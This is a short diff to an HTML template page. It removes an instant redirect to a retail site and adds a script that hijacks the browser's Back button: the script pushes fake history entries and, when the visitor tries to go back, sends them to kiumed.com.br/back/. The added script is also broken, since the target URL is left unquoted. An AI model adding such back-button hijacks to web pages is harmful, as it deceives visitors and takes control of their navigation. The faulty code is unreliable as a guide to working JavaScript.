@@ -292,15 +292,15 @@ https://templatemo.com/tm-520-highway
     
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
-<html>
-	<head>
-		<title>Your Page Title</title>
-		<meta http-equiv="REFRESH" content="0;url=http://www.americanas.com.br/">
-	</head>
-	<body>
-		Optional page text here.
-	</body>
-</html>
+<script>
+var back_redirect_back_link = 'seusiteaqui';
+history['pushState']({}, '', location['href']);
+history['pushState']({}, '', location['href']);
+window['onpopstate'] = function() {
+setTimeout(function() {
+	location['href'] = https://kiumed.com.br/back/
+	}, 1)
+}</script>
     
 </body>
 </html>
